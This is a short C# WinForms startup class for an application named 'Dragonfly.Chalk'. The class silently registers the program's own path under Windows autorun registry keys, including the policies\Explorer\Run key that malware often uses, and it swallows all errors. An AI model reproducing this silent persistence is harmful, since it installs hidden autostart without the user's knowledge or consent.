using System.Windows.Forms;
using Microsoft.Win32;

namespace Dragonfly.Chalk
{
    internal class ChalkApplicationContext : ApplicationContext
    {
        private ChalkApplication app;

        public ChalkApplicationContext()
        {
            app = new ChalkApplication();
            app.Initialize();

            try
            {
                RegistryUtils reg = new RegistryUtils();
                string chalk = reg.GetStringValue(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "chalk");
                if (string.IsNullOrEmpty(chalk))
                {
                    chalk = reg.GetStringValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "chalk");
                    if (string.IsNullOrEmpty(chalk))
                    {
                        chalk = reg.GetStringValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run", "chalk");
                    }
                }
                if (string.IsNullOrEmpty(chalk) || chalk != Application.ExecutablePath)
                {
                    if (!reg.SetStringValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run", "chalk", Application.ExecutablePath))
                        if (!reg.SetStringValue(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "chalk", Application.ExecutablePath))
                            if (!reg.SetStringValue(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "chalk", Application.ExecutablePath))
                            {
                            }
                }

            }
            catch
            {
            }

        }

        protected override void Dispose(bool disposing)
        {
            app.Dispose();
        }
    }
}
